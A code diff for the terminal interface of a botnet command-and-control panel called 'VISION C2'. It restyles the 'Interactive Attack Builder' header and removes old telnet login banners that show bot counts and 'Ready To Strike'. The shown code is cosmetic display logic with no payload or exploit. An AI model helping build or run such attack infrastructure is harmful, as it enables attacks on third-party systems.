@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"net"
 	"strconv"
 	"strings"
 	"time"
@@ -1527,21 +1526,42 @@ func (m TUIModel) viewAttack() string {
 	// CYBERPUNK ATTACK CENTER HEADER
 	// ═══════════════════════════════════════════════════════════════════════
 
-	// ASCII art header
+	// Purple gradient colors matching main banner
+	gradientColors := []lipgloss.Style{
+		lipgloss.NewStyle().Foreground(lipgloss.Color("93")),  // Purple1 - darkest
+		lipgloss.NewStyle().Foreground(lipgloss.Color("99")),  // Purple2
+		lipgloss.NewStyle().Foreground(lipgloss.Color("105")), // Purple3
+		lipgloss.NewStyle().Foreground(lipgloss.Color("111")), // Purple4
+		lipgloss.NewStyle().Foreground(lipgloss.Color("117")), // Purple5
+		lipgloss.NewStyle().Foreground(lipgloss.Color("123")), // Purple6
+		lipgloss.NewStyle().Foreground(lipgloss.Color("159")), // Purple7
+		lipgloss.NewStyle().Foreground(lipgloss.Color("195")), // Purple8 - lightest
+		lipgloss.NewStyle().Foreground(lipgloss.Color("159")), // Purple7 (reverse gradient)
+		lipgloss.NewStyle().Foreground(lipgloss.Color("117")), // Purple5
+	}
+
+	// ASCII art header with gradient
 	b.WriteString("\n")
 	headerArt := []string{
-		"       d8888 888    888                      888           888888b.            d8b 888      888                 ",
-		"      d88888 888    888                      888           888   88b           Y8P 888      888                  ",
-		"     d88P888 888    888                      888           888  .88P               888      888                  ",
-		"    d88P 888 888888 888888  8888b.   .d8888b 888  888      8888888K.  888  888 888 888  .d88888  .d88b.  888d888 ",
-		"   d88P  888 888    888         88b d88P     888 .88P      888   Y88b 888  888 888 888 d88  888 d8P  Y8b 888P    ",
-		"  d88P   888 888    888    .d888888 888      888888K       888    888 888  888 888 888 888  888 88888888 888     ",
-		" d8888888888 Y88b.  Y88b.  888  888 Y88b.    888  88b      888   d88P Y88b 888 888 888 Y88b 888 Y8b.     888     ",
-		"d88P     888   Y888   Y888  Y888888   Y8888P 888  888      8888888P     Y88888 888 888   Y88888   Y8888  888     ",
-		" ================================================================================================================",
+		"  ______     __      __                          __                 ",
+		" /       |  /  |    /  |                        /  |                ",
+		"/$$$$$$  | _$$ |_  _$$ |_     ______    _______ $$ |   __   _______ ",
+		"$$ |__$$ |/ $$   |/ $$   |   /      |  /       |$$ |  /  | /       |",
+		"$$    $$ |$$$$$$/ $$$$$$/    $$$$$$  |/$$$$$$$/ $$ |_/$$/ /$$$$$$$/ ",
+		"$$$$$$$$ |  $$ | __ $$ | __  /    $$ |$$ |      $$   $$<  $$      $ ",
+		"$$ |  $$ |  $$ |/  |$$ |/  |/$$$$$$$ |$$ |______ $$$$$$    $$$$$$  |",
+		"$$ |  $$ |  $$  $$/ $$  $$/ $$    $$ |$$       |$$ | $$  |/     $$/ ",
+		"$$/   $$/    $$$$/   $$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/ $$$$$$$/  ",
+		" ═══════════════════════════════════════════════════════════════",
+		"     			☾℣☽  INTERACTIVE ATTACK BUILDER  ☾℣☽   ",
+		" ═══════════════════════════════════════════════════════════════",
 	}
-	for _, line := range headerArt {
-		b.WriteString(neonCyan.Bold(true).Render(line) + "\n")
+	for i, line := range headerArt {
+		colorIdx := i
+		if colorIdx >= len(gradientColors) {
+			colorIdx = len(gradientColors) - 1
+		}
+		b.WriteString(gradientColors[colorIdx].Bold(true).Render(line) + "\n")
 	}
 
 	// Count ongoing attacks from both sources
@@ -2573,172 +2593,6 @@ func NewTUIModel() TUIModel {
 		shellOutput:    []string{},
 		shellHistory:   []string{},
 	}
-}
-
-// ============================================================================
-// LEGACY ASCII UI FUNCTIONS (for telnet clients)
-// ============================================================================
-
-// RenderLoginBanner displays the neon futuristic login screen
-func RenderLoginBanner(conn net.Conn) {
-	conn.Write([]byte(ClearScreen))
-	conn.Write([]byte(ColorReset))
-	conn.Write([]byte(ClearScreen))
-
-	conn.Write([]byte("\r\n"))
-	conn.Write([]byte(ColorCyan + "     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyan + "     █" + ColorBlack + "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░" + ColorCyan + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanLight + "     █" + ColorBlack + "░" + ColorMagenta + "╔════════════════════════════════════════════════════╗" + ColorBlack + "░" + ColorCyanLight + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanLight + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "                                                    " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanLight + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanMid + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "       " + ColorCyan + "██╗   ██╗" + ColorCyanLight + "██╗" + ColorCyanMid + "███████╗" + ColorCyanPale + "██╗" + ColorCyanWhite + " ██████╗ " + ColorWhite + "███╗   ██╗" + ColorBlack + "     " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanMid + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanMid + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "       " + ColorCyan + "██║   ██║" + ColorCyanLight + "██║" + ColorCyanMid + "██╔════╝" + ColorCyanPale + "██║" + ColorCyanWhite + "██╔═══██╗" + ColorWhite + "████╗  ██║" + ColorBlack + "     " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanMid + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanPale + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "       " + ColorCyan + "██║   ██║" + ColorCyanLight + "██║" + ColorCyanMid + "███████╗" + ColorCyanPale + "██║" + ColorCyanWhite + "██║   ██║" + ColorWhite + "██╔██╗ ██║" + ColorBlack + "     " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanPale + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanPale + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "       " + ColorCyan + "╚██╗ ██╔╝" + ColorCyanLight + "██║" + ColorCyanMid + "╚════██║" + ColorCyanPale + "██║" + ColorCyanWhite + "██║   ██║" + ColorWhite + "██║╚██╗██║" + ColorBlack + "     " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanPale + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanWhite + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "        " + ColorCyan + "╚████╔╝ " + ColorCyanLight + "██║" + ColorCyanMid + "███████║" + ColorCyanPale + "██║" + ColorCyanWhite + "╚██████╔╝" + ColorWhite + "██║ ╚████║" + ColorBlack + "     " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanWhite + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanWhite + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "         " + ColorCyan + "╚═══╝  " + ColorCyanLight + "╚═╝" + ColorCyanMid + "╚══════╝" + ColorCyanPale + "╚═╝" + ColorCyanWhite + " ╚═════╝ " + ColorWhite + "╚═╝  ╚═══╝" + ColorBlack + "     " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanWhite + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorWhite + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "                        " + ColorMagenta + "☾ " + ColorCyan + "C" + ColorCyanLight + "2 " + ColorMagenta + "V" + ColorBlack + "                         " + ColorMagenta + "║" + ColorBlack + "░" + ColorWhite + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorWhite + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "                                                    " + ColorMagenta + "║" + ColorBlack + "░" + ColorWhite + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanWhite + "     █" + ColorBlack + "░" + ColorMagenta + "╠════════════════════════════════════════════════════╣" + ColorBlack + "░" + ColorCyanWhite + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanPale + "     █" + ColorBlack + "░" + ColorMagenta + "║" + ColorBlack + "   " + ColorCyan + "◢◤" + ColorGray + " AUTHORIZED PERSONNEL ONLY " + ColorCyan + "◢◤" + ColorBlack + "   " + ColorRed + "⚠ MONITORED ⚠" + ColorBlack + "   " + ColorMagenta + "║" + ColorBlack + "░" + ColorCyanPale + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanMid + "     █" + ColorBlack + "░" + ColorMagenta + "╚════════════════════════════════════════════════════╝" + ColorBlack + "░" + ColorCyanMid + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyanLight + "     █" + ColorBlack + "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░" + ColorCyanLight + "█" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyan + "     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀" + ColorReset + "\r\n"))
-	conn.Write([]byte("\r\n"))
-}
-
-// RenderAuthAnimation shows the loading animation during login
-func RenderAuthAnimation(conn net.Conn) {
-	conn.Write([]byte("\r\n"))
-	authFrames := []string{
-		"     " + ColorCyan + "[" + ColorMagenta + "■" + ColorDarkGray + "□□□□□□□□□" + ColorCyan + "]" + ColorGray + " Initializing secure tunnel..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■" + ColorDarkGray + "□□□□□□□□" + ColorCyan + "]" + ColorGray + " Encrypting handshake..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■" + ColorDarkGray + "□□□□□□□" + ColorCyan + "]" + ColorGray + " Validating credentials..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■■" + ColorDarkGray + "□□□□□□" + ColorCyan + "]" + ColorGray + " Checking access matrix..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■" + ColorDarkGray + "□□□□□" + ColorCyan + "]" + ColorGray + " Decrypting session key..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■" + ColorDarkGray + "□□□□" + ColorCyan + "]" + ColorGray + " Establishing neural link..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■■" + ColorDarkGray + "□□□" + ColorCyan + "]" + ColorGray + " Loading user profile..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■■■" + ColorDarkGray + "□□" + ColorCyan + "]" + ColorGray + " Syncing botnet status..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■■■■" + ColorDarkGray + "□" + ColorCyan + "]" + ColorGray + " Finalizing connection..." + ColorReset,
-		"     " + ColorCyan + "[" + ColorGreen + "■■■■■■■■■■" + ColorCyan + "]" + ColorGreen + " Complete!" + ColorReset,
-	}
-	for _, frame := range authFrames {
-		conn.Write([]byte(fmt.Sprintf("\r%s", frame)))
-		time.Sleep(100 * time.Millisecond)
-	}
-	conn.Write([]byte("\r\n"))
-}
-
-// RenderAccessGranted shows success message
-func RenderAccessGranted(conn net.Conn) {
-	conn.Write([]byte("\r\n"))
-	conn.Write([]byte(ColorCyan + "     ╔══════════════════════════════════════════════════════╗" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyan + "     ║  " + ColorGreen + "✓ ACCESS GRANTED" + ColorCyan + "  │  " + ColorWhite + "WELCOME TO THE GRID" + ColorCyan + "  │  " + ColorMagenta + "☾V☽" + ColorCyan + "  ║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorCyan + "     ╚══════════════════════════════════════════════════════╝" + ColorReset + "\r\n"))
-	time.Sleep(800 * time.Millisecond)
-}
-
-// RenderAccessDenied shows failure message
-func RenderAccessDenied(conn net.Conn) {
-	conn.Write([]byte("\r\n"))
-	conn.Write([]byte(ColorRed + "     ╔══════════════════════════════════════════════════════╗" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ║  " + ColorWhite + "✗ ACCESS DENIED" + ColorRed + "  │  " + ColorGray + "INVALID CREDENTIALS" + ColorRed + "  │  " + ColorMagenta + "⚠" + ColorRed + "   ║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ╚══════════════════════════════════════════════════════╝" + ColorReset + "\r\n"))
-	time.Sleep(1500 * time.Millisecond)
-}
-
-// RenderLockout shows the security lockout message
-func RenderLockout(conn net.Conn) {
-	conn.Write([]byte(ClearScreen))
-	conn.Write([]byte("\r\n\r\n\r\n"))
-	conn.Write([]byte(ColorRed + "     ╔══════════════════════════════════════════════════════════╗" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ║" + ColorBlack + "                                                          " + ColorRed + "║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ║  " + ColorWhite + "☠ " + ColorRed + "SECURITY LOCKOUT" + ColorWhite + " ☠  " + ColorGray + "Too many failed attempts" + ColorRed + "       ║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ║" + ColorBlack + "                                                          " + ColorRed + "║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ║  " + ColorCyan + "◢◤" + ColorGray + " Your connection has been logged and flagged " + ColorCyan + "◢◤" + ColorRed + "   ║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ║" + ColorBlack + "                                                          " + ColorRed + "║" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorRed + "     ╚══════════════════════════════════════════════════════════╝" + ColorReset + "\r\n"))
-	time.Sleep(2 * time.Second)
-}
-
-// RenderMainBanner shows the All-Seeing Eye banner with stats
-func RenderMainBanner(conn net.Conn) {
-	conn.Write([]byte(ClearScreen))
-	conn.Write([]byte("\r\n"))
-
-	conn.Write([]byte(ColorPurple1 + "                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple2 + "                        ░░▒▒▓▓████████████████████▓▓▒▒░░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple3 + "                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple4 + "                 ░▓██▓░░  ╔═════════════════════════╗  ░░▓██▓░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple5 + "               ▒██▓░     ║" + ColorRed + "  ☾ " + ColorWhite + "V I S I O N " + ColorRed + "V " + ColorWhite + "C 2  " + ColorPurple5 + "  ║   ░▓██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple6 + "             ▒██▒        ╠═════════════════════════╣        ▒██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(fmt.Sprintf(ColorPurple7 + "            ▓█▓          ║ " + ColorGreen + "●" + ColorWhite + " Status:  " + ColorGreen + "ONLINE" + ColorPurple7 + "       ║         ▓█▓" + ColorReset + "\r\n")))
-	conn.Write([]byte(fmt.Sprintf(ColorPurple8+"           ▓█▒           ║ "+ColorOrange+"◈"+ColorWhite+" Bots:    "+ColorGreen+"%-4d"+ColorPurple8+"         ║          ▒█▓"+ColorReset+"\r\n", getBotCount())))
-	conn.Write([]byte(fmt.Sprintf(ColorWhite+"          ▒█▓            ║ "+ColorOrange+"◈"+ColorWhite+" Proto:   "+ColorOrange+"%-11s"+ColorWhite+"  ║         ▓█▒"+ColorReset+"\r\n", PROTOCOL_VERSION)))
-	conn.Write([]byte(ColorPurple8 + "           ▓█▒           ║ " + ColorOrange + "◈" + ColorWhite + " Encrypt: " + ColorGreen + "TLS 1.3" + ColorPurple8 + "      ║        ▒█▓" + ColorReset + "\r\n"))
-	conn.Write([]byte(fmt.Sprintf(ColorPurple7+"            ▓█▓          ║ "+ColorOrange+"◈"+ColorWhite+" RAM:     "+ColorGreen+"%-11s"+ColorPurple7+"  ║       ▓█▓"+ColorReset+"\r\n", formatRAM(getTotalRAM()))))
-	conn.Write([]byte(ColorPurple6 + "             ▒██▒        ╠═════════════════════════╣        ▒██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple5 + "               ▒██▓░     ║" + ColorGray + "  help " + ColorDarkGray + "• " + ColorGray + "attack " + ColorDarkGray + "• " + ColorGray + "exit  " + ColorPurple5 + " ║    ░▓██▒" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple4 + "                 ░▓██▓░░ ╚═════════════════════════╝  ░░▓██▓░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple3 + "                    ░▒▓███▓▒░░                  ░░▒▓███▓▒░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple2 + "                        ░░▒▒▓▓████████████████████▓▓▒▒░░" + ColorReset + "\r\n"))
-	conn.Write([]byte(ColorPurple1 + "                              ░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░" + ColorReset + "\r\n"))
-	conn.Write([]byte("\r\n"))
-
-	conn.Write([]byte(ColorDarkGray + "                   ══════════ ☠ Ready To Strike ☠ ══════════" + ColorReset + "\r\n"))
-	conn.Write([]byte("\r\n"))
-}
-
-// RenderInputBox draws the neon input box for login
-func RenderInputBox(conn net.Conn) {
-	conn.Write([]byte(ColorMagenta + "     ┌─────────────────────────────────────────────────────┐" + ColorReset + "\r\n"))
-}
-
-// RenderInputBoxClose closes the input box
-func RenderInputBoxClose(conn net.Conn) {
-	conn.Write([]byte(ColorReset))
-	conn.Write([]byte(ColorMagenta + "     └─────────────────────────────────────────────────────┘" + ColorReset + "\r\n"))
-}
-
-// RenderUserPrompt shows the username prompt
-func RenderUserPrompt(conn net.Conn) {
-	conn.Write([]byte(ColorMagenta + "     │ " + ColorCyan + "⬡" + ColorWhite + " USER  " + ColorMagenta + "│" + ColorReset + " "))
-}
-
-// RenderPasswordPrompt shows the password prompt (hidden text)
-func RenderPasswordPrompt(conn net.Conn) {
-	conn.Write([]byte(ColorMagenta + "     │ " + ColorRed + "⬡" + ColorWhite + " PASS  " + ColorMagenta + "│" + ColorBlack + ColorBgBlack + " "))
-}
-
-// RenderAttemptCounter shows login attempt number
-func RenderAttemptCounter(conn net.Conn, attempt int) {
-	conn.Write([]byte(fmt.Sprintf(ColorRed+"              ⚠ "+ColorWhite+"Login attempt "+ColorCyan+"%d"+ColorWhite+" of "+ColorCyan+"3"+ColorWhite+" - "+ColorRed+"Access denied"+ColorReset+"\r\n\r\n", attempt)))
-}
-
-// ============================================================================
-// HELPER FUNCTIONS
-// ============================================================================
-
-func truncate(s string, maxLen int) string {
-	if len(s) <= maxLen {
-		return s
-	}
-	return s[:maxLen-3] + "..."
-}
-
-func formatDuration(d time.Duration) string {
-	d = d.Round(time.Second)
-	h := d / time.Hour
-	d -= h * time.Hour
-	m := d / time.Minute
-	d -= m * time.Minute
-	s := d / time.Second
-	if h > 0 {
-		return fmt.Sprintf("%dh%dm", h, m)
-	}
-	if m > 0 {
-		return fmt.Sprintf("%dm%ds", m, s)
-	}
-	return fmt.Sprintf("%ds", s)
 }
 
 // Global TUI program for external updates
